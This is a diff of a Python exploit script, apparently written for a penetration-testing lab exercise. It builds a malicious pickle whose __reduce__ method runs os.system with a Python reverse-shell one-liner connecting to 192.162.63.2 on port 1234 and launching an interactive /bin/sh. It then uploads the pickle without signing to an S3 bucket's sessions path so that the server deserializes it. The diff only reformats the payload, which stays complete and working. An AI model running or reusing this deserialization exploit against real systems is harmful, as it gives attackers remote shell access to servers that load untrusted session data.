@@ -48,8 +48,7 @@ from botocore import UNSIGNED
 from botocore.config import Config
 class Shell(object):
 def __reduce__(self):
-return (os.system,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.162.63.2\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))
+return (os.system,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.162.63.2\",1234)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))
 s3=boto3.client('s3',endpoint_url='http://s3.pentesteracademylab.appspot.com',config=Config(signature_version=UNSIGNED))
 pickledData=pickle.dumps(Shell())
 s3.put_object(Bucket='assets',Key='sessions/43085237187070924862845585858148322582',Body=pickledData)
